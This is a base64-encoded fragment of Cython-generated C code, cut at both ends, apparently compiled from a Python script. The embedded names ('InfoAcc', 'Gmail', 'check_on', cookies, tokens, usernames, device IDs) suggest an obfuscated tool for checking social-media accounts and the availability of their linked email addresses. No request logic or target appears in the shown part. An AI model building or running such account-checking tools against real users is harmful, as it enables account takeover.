Hl4X2ludF8xMDAwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEyNzkwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTI3OTAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEyNzkwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSA9IFB5TG9uZ19Gcm9tTG9uZygxMjc5MDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxNzc1MDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAxID0gUHlMb25nX0Zyb21Mb25nKDE3NzUwMDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAwID0gUHlMb25nX0Zyb21Mb25nKDI3OTc2MDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDEgPSBQeUxvbmdfRnJvbUxvbmcoMjc5NzYwMDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMCA9IFB5TG9uZ19Gcm9tTG9uZyg5MDA5OTAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAxID0gUHlMb25nX0Zyb21Mb25nKDkwMDk5MDAwMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwID0gUHlMb25nX0Zyb21Mb25nKDE2MjkwMTAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE5MDAwMDAwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTkwMDAwMDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE5MDAwMDAwMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyNTAwMDAwMDAwIiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2ID0gUHlMb25nX0Zyb21TdHJpbmcoIjM3MTM2Njg3ODYiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzU2OTk3ODUyMTcgPSBQeUxvbmdfRnJvbVN0cmluZygiNTY5OTc4NTIxNyIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzU2OTk3ODUyMTcpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCI4NTA3OTQwNjM0IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyMTI1NDAyOTgzNCIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIxMjU0MDI5ODM0KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIHJldHVybiAwOwogIF9fcHl4X0wxX2Vycm9yOjsKICByZXR1cm4gLTE7Cn0KCnR5cGVkZWYgc3RydWN0IHsKICAgIHVuc2lnbmVkIGludCBhcmdjb3VudCA6IDI7CiAgICB1bnNpZ25lZCBpbnQgbnVtX3Bvc29ubHlfYXJncyA6IDE7CiAgICB1bnNpZ25lZCBpbnQgbnVtX2t3b25seV9hcmdzIDogMTsKICAgIHVuc2lnbmVkIGludCBubG9jYWxzIDogNTsKICAgIHVuc2lnbmVkIGludCBmbGFncyA6IDEwOwogICAgdW5zaWduZWQgaW50IGZpcnN0X2xpbmUgOiA5OwogICAgdW5zaWduZWQgaW50IGxpbmVfdGFibGVfbGVuZ3RoIDogMTQ7Cn0gX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbjsKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldygKICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLAogICAgICAgIFB5T2JqZWN0ICogY29uc3QgKnZhcm5hbWVzLAogICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSwKICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsCiAgICAgICAgY29uc3QgY2hhciAqbGluZV90YWJsZSwKICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwCik7CgoKc3RhdGljIGludCBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBQeU9iamVjdCogdHVwbGVfZGVkdXBfbWFwID0gUHlEaWN0X05ldygpOwogIGlmICh1bmxpa2VseSghdHVwbGVfZGVkdXBfbWFwKSkgcmV0dXJuIC0xOwogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCAxMTMsIDJ9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19xLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCAxMTQsIDJ9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19xLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCAxMTUsIDJ9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsyXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19fMTgsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDQwOSwgMn07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9fMTl9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fbmVfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X2tfMV8yLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzNdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDkzLCA5M307CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9iLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ibywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb3V0cHV0fTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX25lX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcHBwLCBfX3B5eF9rX2hhc19nUWlyX3NfQV9iX0FfQV9BX0Ffd2ZBUV93ZkEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNF0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxNywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDExMSwgMzM5fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X24xLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9uMiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaG9zdCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGUzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXMxLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90b2ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Nvb2tpZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90bCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwcn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls1XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGxsLCBfX3B5eF9rX1J1Q3FfUnVDcV9yX2NfYV9xX0FfQV9RY194dDFfQSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls1XSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDUsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxNjQsIDE5N307CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VyLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfcn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzdCwgX19weXhfa18xX2FfUV8xXzFfQV8xX3FfYV9BX3FfQV9hX2FfYV9iLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzZdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDE5OSwgMTY5fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91aWR9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbN10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fbmVfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGUsIF9fcHl4X2tfY18yUnZRXzFfU19hXzFfY19xXzFfc18xX3NfMV82LCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMTYsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAyMjgsIDQwNX07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2csIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JyLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZnVsbF9uYW1lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb3dzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb3dnLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaXNQcmFpc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2JpbywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaXNfdmVyaWZpZWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2JpenosIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X21ldGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3NzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9maWxlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lfTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzhdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX25lX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JbmZvQWNjLCBfX3B5eF9rX2F6XzRxX2FfYV9BXzJUX0FfMlRfUV80cV9xX3JfUW4sIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAxMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDI4NiwgMzY1fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9vLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90bCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaG9zdCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcGFyYW1zLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb2ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZ307CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls5XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfR21haWwsIF9fcHl4X2tfNHNfQ3FfZkFUX0FadDVfUnFfQVp0NV9ScV9HMUZfMSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls5XSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAzNDEsIDY2fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3ZhbHVlfTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEwXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9ybWF0X251bWJlciwgX19weXhfa19FX3ZTX3JfVjJRX3Nfcl9WMlFfM2FzXzEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTBdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgOCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM1MCwgMTk3fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGV2LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kZXZpY2VfaWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3V1aSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2V9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX25lX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jaGVja19vbiwgX19weXhfa19BX0JnVF9RZF83X1pyXzFfUWRfYV9hYWdnaF9BX0EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM4OCwgNTF9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYmJrLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZG8sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkfTsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEyXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9uZV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmFuZF9pZHMsIF9fcHl4X2tfQVZfUWUxX3NfN18xX3FfYSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMl0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxNywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM5NywgODEzfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2RvbWFpbiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYmJrLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZG8sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JuZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF8yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbHNkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JyLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb3dzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwcn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxM10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fbmVfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3V1dSwgX19weXhfa19RX2NfYV9CX0FaelllZW9veV96X0NfQ19EX0RfSl9KLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEzXSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2